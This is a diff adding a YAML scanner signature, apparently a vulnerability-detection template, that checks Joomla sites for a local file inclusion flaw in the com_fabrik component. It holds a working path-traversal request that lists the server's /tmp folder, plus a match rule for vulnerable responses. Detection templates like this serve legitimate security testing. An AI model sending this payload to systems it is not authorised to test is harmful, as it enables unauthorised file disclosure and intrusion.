@@ -1,0 +1,21 @@
+id: joomla-lfi-comfabrik
+info:
+  name: Joomla LFI comfabrik
+  risk: High
+
+params:
+  - root: "{{.BaseURL}}/index.php"
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", '[{"value"') && StringSearch("response", '"disable":false')
+
+reference:
+  - link: https://www.exploit-db.com/exploits/48263
